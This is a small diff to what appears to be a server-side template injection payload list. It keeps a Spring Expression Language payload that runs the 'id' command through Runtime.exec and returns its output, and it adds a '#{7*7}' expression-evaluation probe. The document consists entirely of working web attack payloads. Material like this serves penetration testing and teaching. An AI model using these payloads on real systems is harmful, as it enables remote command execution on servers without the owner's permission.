@@ -20,3 +20,7 @@
 
 - Spring framework
     - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`
+
+```
+#{7*7}
+```
